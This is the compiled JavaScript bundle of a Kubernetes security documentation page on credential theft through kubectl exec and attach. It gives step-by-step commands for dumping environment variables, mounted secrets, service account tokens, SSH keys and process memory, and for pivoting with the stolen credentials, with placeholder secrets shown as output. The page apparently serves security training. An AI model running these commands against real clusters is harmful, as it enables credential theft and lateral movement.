"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[7095],{328(e,n,t){t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"attack_vectors/exec_attach_credential_theft","title":"Exec/Attach Credential Theft","description":"Attack scenario demonstrating how kubectl exec and attach commands can be abused to steal credentials and sensitive data from running containers.","source":"@site/docs/attack_vectors/exec_attach_credential_theft.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/exec_attach_credential_theft","permalink":"/docs/attack_vectors/exec_attach_credential_theft","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/exec_attach_credential_theft.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/docs/tags/attack-vector"},{"inline":true,"label":"exec","permalink":"/docs/tags/exec"},{"inline":true,"label":"rbac","permalink":"/docs/tags/rbac"},{"inline":true,"label":"secrets","permalink":"/docs/tags/secrets"},{"inline":true,"label":"CKS","permalink":"/docs/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1770102262000,"sidebarPosition":20,"frontMatter":{"sidebar_position":20,"title":"Exec/Attach Credential Theft","description":"Attack scenario demonstrating how kubectl exec and attach commands can be abused to steal credentials and sensitive data from running containers.","keywords":["kubernetes security","kubectl exec","kubectl attach","credential theft","container access","RBAC permissions","credential extraction","environment variables","secrets theft","lateral movement"],"tags":["attack-vector","exec","rbac","secrets","CKS"],"related":["/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/exec_attach_security/","/docs/attack_vectors/insecure_rbac_permissions/","/docs/attack_vectors/insecure_secrets_management/","/docs/fundamentals/authorization/rbac/"]},"sidebar":"default","previous":{"title":"Service Account Token Projection Abuse","permalink":"/docs/attack_vectors/service_account_token_abuse"},"next":{"title":"Cloud Metadata Service Abuse","permalink":"/docs/attack_vectors/cloud_metadata_service_abuse"}}');var c=t(4848),a=t(8453);const r={sidebar_position:20,title:"Exec/Attach Credential Theft",description:"Attack scenario demonstrating how kubectl exec and attach commands can be abused to steal credentials and sensitive data from running containers.",keywords:["kubernetes security","kubectl exec","kubectl attach","credential theft","container access","RBAC permissions","credential extraction","environment variables","secrets theft","lateral movement"],tags:["attack-vector","exec","rbac","secrets","CKS"],related:["/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/exec_attach_security/","/docs/attack_vectors/insecure_rbac_permissions/","/docs/attack_vectors/insecure_secrets_management/","/docs/fundamentals/authorization/rbac/"]},i="Exec/Attach Credential Theft",o={},l=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Enumerate Accessible Pods",id:"1-enumerate-accessible-pods",level:3},{value:"2. Extract Environment Variables with Secrets",id:"2-extract-environment-variables-with-secrets",level:3},{value:"3. Access Mounted Secrets from Filesystem",id:"3-access-mounted-secrets-from-filesystem",level:3},{value:"4. Extract Application Configuration Files",id:"4-extract-application-configuration-files",level:3},{value:"5. Steal SSH Keys and Certificates",id:"5-steal-ssh-keys-and-certificates",level:3},{value:"6. Dump Process Memory for Credentials",id:"6-dump-process-memory-for-credentials",level:3},{value:"7. Access Container Shell for Interactive Reconnaissance",id:"7-access-container-shell-for-interactive-reconnaissance",level:3},{value:"8. Pivot to Other Systems Using Stolen Credentials",id:"8-pivot-to-other-systems-using-stolen-credentials",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.header,{children:(0,c.jsx)(n.h1,{id:"execattach-credential-theft",children:"Exec/Attach Credential Theft"})}),"\n",(0,c.jsxs)(n.p,{children:["The Kubernetes ",(0,c.jsx)(n.strong,{children:"exec"})," and ",(0,c.jsx)(n.strong,{children:"attach"})," subresources allow users to execute commands inside running containers or attach to their processes. While essential for debugging and operations, these capabilities can be exploited by attackers with RBAC permissions to steal credentials, extract secrets, and pivot to other systems."]}),"\n",(0,c.jsxs)(n.p,{children:["This attack demonstrates how compromised user accounts or service accounts with ",(0,c.jsx)(n.code,{children:"pods/exec"})," or ",(0,c.jsx)(n.code,{children:"pods/attach"})," permissions can access sensitive data from any pod in authorized namespaces."]}),"\n",(0,c.jsx)(n.hr,{}),"\n",(0,c.jsx)(n.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,c.jsx)(n.p,{children:"Attackers with exec/attach permissions can interact with running containers to extract credentials and sensitive information."}),"\n",(0,c.jsx)(n.h3,{id:"1-enumerate-accessible-pods",children:"1. Enumerate Accessible Pods"}),"\n",(0,c.jsx)(n.p,{children:"Discover which pods the compromised account can access."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# List all pods in accessible namespaces\nkubectl get pods -A\n\n# Check exec permissions\nkubectl auth can-i create pods/exec -n production\nkubectl auth can-i create pods/attach -n production\n\n# Find pods running in production\nkubectl get pods -n production -o wide\n"})}),"\n",(0,c.jsx)(n.h3,{id:"2-extract-environment-variables-with-secrets",children:"2. Extract Environment Variables with Secrets"}),"\n",(0,c.jsx)(n.p,{children:"Environment variables often contain database passwords, API keys, and access tokens."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Execute command to dump environment variables\nkubectl exec -n production webapp-pod-abc123 -- env\n\n# Filter for sensitive patterns\nkubectl exec -n production webapp-pod-abc123 -- env | grep -E '(PASSWORD|SECRET|TOKEN|KEY|CREDENTIAL)'\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.strong,{children:"Output:"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"DATABASE_PASSWORD=P@ssw0rd123!\nAPI_KEY=sk-1234567890abcdef\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nREDIS_PASSWORD=SuperSecret456\nSTRIPE_API_KEY=sk_live_51abcdefghijk\n"})}),"\n",(0,c.jsx)(n.h3,{id:"3-access-mounted-secrets-from-filesystem",children:"3. Access Mounted Secrets from Filesystem"}),"\n",(0,c.jsx)(n.p,{children:"Secrets mounted as volumes can be read directly from the container filesystem."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# List mounted secrets\nkubectl exec -n production webapp-pod-abc123 -- ls -la /var/run/secrets\n\n# Read database credentials\nkubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/database/username\nkubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/database/password\n\n# Read service account token\nkubectl exec -n production webapp-pod-abc123 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"})}),"\n",(0,c.jsx)(n.h3,{id:"4-extract-application-configuration-files",children:"4. Extract Application Configuration Files"}),"\n",(0,c.jsx)(n.p,{children:"Applications often store credentials in configuration files."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'# Read application config\nkubectl exec -n production webapp-pod-abc123 -- cat /app/config/database.yml\n\n# Search for credential files\nkubectl exec -n production webapp-pod-abc123 -- find / -name "*.conf" -o -name "*.yml" -o -name "*.env" 2>/dev/null\n\n# Read specific config\nkubectl exec -n production webapp-pod-abc123 -- cat /etc/app/credentials.conf\n'})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.strong,{children:"Example config exposure:"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-yaml",children:"database:\n  host: postgres.production.svc.cluster.local\n  port: 5432\n  username: admin\n  password: ProductionDB2024!\n\nredis:\n  host: redis-master.production.svc\n  password: RedisPass789\n\naws:\n  access_key_id: AKIAIOSFODNN7EXAMPLE\n  secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"})}),"\n",(0,c.jsx)(n.h3,{id:"5-steal-ssh-keys-and-certificates",children:"5. Steal SSH Keys and Certificates"}),"\n",(0,c.jsx)(n.p,{children:"SSH keys and TLS certificates may be present in containers for external system access."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'# Look for SSH keys\nkubectl exec -n production webapp-pod-abc123 -- find /root -name "id_rsa" -o -name "id_ed25519"\nkubectl exec -n production webapp-pod-abc123 -- cat /root/.ssh/id_rsa\n\n# Find TLS certificates\nkubectl exec -n production webapp-pod-abc123 -- find / -name "*.key" -o -name "*.pem" 2>/dev/null\n\n# Extract certificate\nkubectl exec -n production webapp-pod-abc123 -- cat /app/certs/server.key\n'})}),"\n",(0,c.jsx)(n.h3,{id:"6-dump-process-memory-for-credentials",children:"6. Dump Process Memory for Credentials"}),"\n",(0,c.jsx)(n.p,{children:"Running processes may hold credentials in memory."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Get process list\nkubectl exec -n production webapp-pod-abc123 -- ps aux\n\n# Dump process memory (requires gdb or similar tools)\nkubectl exec -n production webapp-pod-abc123 -- gdb -p 1 -batch -ex 'generate-core-file /tmp/core.1'\n\n# Extract from core dump\nkubectl exec -n production webapp-pod-abc123 -- strings /tmp/core.1 | grep -E '(password|secret|token)'\n"})}),"\n",(0,c.jsx)(n.h3,{id:"7-access-container-shell-for-interactive-reconnaissance",children:"7. Access Container Shell for Interactive Reconnaissance"}),"\n",(0,c.jsx)(n.p,{children:"Gain full shell access to explore the container environment."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:"# Get interactive shell\nkubectl exec -it -n production webapp-pod-abc123 -- /bin/bash\n\n# Inside the container:\n# Check bash history for previous commands\ncat ~/.bash_history\n\n# Check for credential stores\ncat ~/.aws/credentials\ncat ~/.kube/config\ncat ~/.docker/config.json\n\n# Check running processes and connections\nnetstat -tupln\nps auxww | grep -E '(mysql|postgres|redis|mongo)'\n"})}),"\n",(0,c.jsx)(n.h3,{id:"8-pivot-to-other-systems-using-stolen-credentials",children:"8. Pivot to Other Systems Using Stolen Credentials"}),"\n",(0,c.jsx)(n.p,{children:"Use extracted credentials to access databases, cloud services, and other infrastructure."}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-bash",children:'# Connect to database using stolen credentials\nkubectl exec -n production webapp-pod-abc123 -- \\\n  mysql -h postgres.production.svc.cluster.local \\\n  -u admin -p\'ProductionDB2024!\' \\\n  -e "SELECT user, password FROM users LIMIT 10;"\n\n# Access AWS services\nkubectl exec -n production webapp-pod-abc123 -- \\\n  aws s3 ls --region us-west-2\n\n# Access internal APIs\nkubectl exec -n production webapp-pod-abc123 -- \\\n  curl -H "Authorization: Bearer sk-1234567890abcdef" \\\n  https://internal-api.company.com/admin/users\n'})}),"\n",(0,c.jsx)(n.h3,{id:"result",children:"Result"}),"\n",(0,c.jsx)(n.p,{children:"The attacker now has:"}),"\n",(0,c.jsxs)(n.ul,{children:["\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"Database credentials"})," for production databases"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"API keys"})," for external services (Stripe, AWS, GCP, Azure)"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"Service account tokens"})," for Kubernetes API access"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"SSH private keys"})," for accessing other servers"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"TLS certificates"})," for man-in-the-middle attacks"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"Application secrets"})," including encryption keys"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"Ability to pivot"})," to databases, cloud services, and internal APIs"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.strong,{children:"Persistent access"})," through extracted long-lived credentials"]}),"\n"]}),"\n",(0,c.jsx)(n.hr,{}),"\n",(0,c.jsx)(n.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,c.jsx)(n.p,{children:"See the mitigation strategies in:"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/exec_attach_security",children:"Securing Exec and Attach Access"})}),"\n",(0,c.jsx)(n.hr,{}),"\n",(0,c.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,c.jsx)(n.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,c.jsxs)(n.ol,{children:["\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.a,{href:"https://kubernetes.io/docs/reference/access-authn-authz/rbac/",children:"Using RBAC Authorization"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.a,{href:"https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/",children:"Get a Shell to a Running Container"})," - Kubernetes Documentation"]}),"\n",(0,c.jsxs)(n.li,{children:[(0,c.jsx)(n.a,{href:"https://kubernetes.io/docs/concepts/configuration/secret/",children:"Secrets"})," - Kubernetes Documentation"]}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(d,{...e})}):d(e)}},8453(e,n,t){t.d(n,{R:()=>r,x:()=>i});var s=t(6540);const c={},a=s.createContext(c);function r(e){const n=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:r(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);